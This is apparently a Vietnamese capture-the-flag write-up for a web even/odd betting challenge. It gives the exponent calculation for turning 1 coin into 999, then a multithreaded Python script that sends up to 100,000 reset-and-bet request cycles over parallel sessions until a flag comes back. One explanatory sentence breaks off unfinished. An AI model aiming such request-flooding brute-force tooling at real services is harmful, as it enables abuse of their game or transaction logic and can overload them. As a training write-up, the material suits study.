

---
Tài liệu/Bài báo tham khảo:


---

![[Pasted image 20261014142206.png]]

Mình cần đạt số điểm 999 trong game này.
![[Pasted image 20261014144518.png]]
Cơ chế đơn giản là mình sẽ gửi GET request đến server dự đoán của mình là chẵn hay lẻ thì server sẽ xem xét mình có đúng không:
- Nếu đúng: x2 số tiền
- Nếu sai: Mất số tiền đã cược

Server lưu số tiền còn lại của mình ứng với session cookie nên không sửa được.
Đáp án đúng cũng là ngẫu nhiên, không tuân theo quy luật nào cả.

Lúc này mình tính toán để nghĩ đến phương án Brute-force bằng cách gửi hàng trăm nghìn request với nhiều session khác nhau chạy đồng thời vào:

Cách nhanh nhất để tăng từ 1 lên 999 chính là để tên tăng lên theo cấp số nhân:

$1*2^n \geq 999 \implies n \geq \log_{2}999 \approx 10$

Do đó cần 10 attempt để có thể đạt được qua 999 coin.
Và chơi all-in theo cách này thì đương nhiên phải trúng 10 lần liên tiếp, do




```python
import http.client
import json
import sys
import threading
import time
import urllib.parse
import queue
import socket
from concurrent.futures import ThreadPoolExecutor, as_completed

HOST = "web-real-gambling-experience-2932622c453f.training.bksec.vn"
TARGET = 999
TIMEOUT_SECONDS = 15
DEFAULT_MAX_ATTEMPTS = 100000
DEFAULT_WORKERS = 64          # tăng mạnh
RETRIES = 3

print_lock = threading.Lock()
stats_lock = threading.Lock()
stats = {"attempts": 0, "wins": 0, "start": time.time()}

# Cho phép tái sử dụng connection nhiều lần
socket.setdefaulttimeout(TIMEOUT_SECONDS)


class Session:
    """HTTPS keep-alive connection with persistent PHPSESSID cookie."""

    def __init__(self):
        self.conn = None
        self.cookie = None
        self._connect()

    def _connect(self):
        try:
            if self.conn:
                self.conn.close()
        except Exception:
            pass
        self.conn = http.client.HTTPSConnection(HOST, timeout=TIMEOUT_SECONDS)

    def _reconnect(self):
        self._connect()

    def call(self, params):
        path = "/?" + urllib.parse.urlencode(params)
        headers = {"Connection": "keep-alive"}
        if self.cookie:
            headers["Cookie"] = self.cookie

        last_exc = None
        for attempt in range(RETRIES):
            try:
                self.conn.request("GET", path, headers=headers)
                resp = self.conn.getresponse()
                body = resp.read()
                for name, value in resp.getheaders():
                    if name.lower() == "set-cookie" and value.startswith("PHPSESSID="):
                        self.cookie = value.split(";", 1)[0]
                return json.loads(body.decode("utf-8"))
            except (http.client.HTTPException, OSError, json.JSONDecodeError) as e:
                last_exc = e
                self._reconnect()
                if attempt == RETRIES - 1:
                    raise
        raise last_exc


def play_attempt(session):
    """Reset và all-in liên tục cho đến khi 0 hoặc >= TARGET."""
    data = session.call({"act": "reset"})
    if data.get("status") != "ok":
        raise RuntimeError(f"Reset failed: {data}")
    coins = int(data["coins"])

    last_data = data
    while 0 < coins < TARGET:
        amount = min(coins, TARGET - coins)
        last_data = session.call({"act": "bet", "bet_amount": amount, "choice": 0})
        if last_data.get("status") != "ok":
            raise RuntimeError(f"Bet failed: {last_data}")

        coins = int(last_data["coins"])
        if last_data.get("flag"):
            return last_data["flag"]

    if coins >= TARGET:
        with print_lock:
            print(f"[!] Reached {coins} coins but no flag: {last_data}")
    return None


def report_attempt(won):
    with stats_lock:
        stats["attempts"] += 1
        if won:
            stats["wins"] += 1
        attempts = stats["attempts"]
        if attempts % 500 == 0:
            elapsed = time.time() - stats["start"]
            with print_lock:
                print(f"[*] {attempts} attempts | {attempts / elapsed:.1f}/s | wins={stats['wins']}")


def worker(stop_event, ticket, ticket_lock, max_attempts, flag_box, flag_lock):
    # mỗi worker giữ 1 session và tái dùng
    session = Session()
    while not stop_event.is_set():
        with ticket_lock:
            if ticket["next"] >= max_attempts:
                return None
            ticket["next"] += 1

        try:
            flag = play_attempt(session)
        except Exception as e:
            # lỗi mạng → bỏ qua attempt này
            with print_lock:
                print(f"[!] Worker error: {e}")
            continue

        report_attempt(bool(flag))
        if flag:
            with flag_lock:
                if flag_box["flag"] is None:
                    flag_box["flag"] = flag
            stop_event.set()
            return flag
    return None


def main():
    max_attempts = int(sys.argv[1]) if len(sys.argv) > 1 else DEFAULT_MAX_ATTEMPTS
    workers = int(sys.argv[2]) if len(sys.argv) > 2 else DEFAULT_WORKERS

    stop_event = threading.Event()
    ticket = {"next": 0}
    ticket_lock = threading.Lock()
    flag_box = {"flag": None}
    flag_lock = threading.Lock()

    try:
        with ThreadPoolExecutor(max_workers=workers) as pool:
            futures = [
                pool.submit(worker, stop_event, ticket, ticket_lock,
                            max_attempts, flag_box, flag_lock)
                for _ in range(workers)
            ]
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    with print_lock:
                        print(f"[!] Future exception: {e}")
    except KeyboardInterrupt:
        stop_event.set()
        print("\n[*] Interrupted by user")

    elapsed = time.time() - stats["start"]
    if flag_box["flag"]:
        print(f"[+] FLAG: {flag_box['flag']}")
    else:
        print("[x] No flag found within the attempt limit")
    print(f"[*] Total attempts: {stats['attempts']}, wins: {stats['wins']}, time: {elapsed:.1f}s")
    if elapsed > 0:
        print(f"[*] Average rate: {stats['attempts']/elapsed:.1f} attempts/s")


if __name__ == "__main__":
    main()
```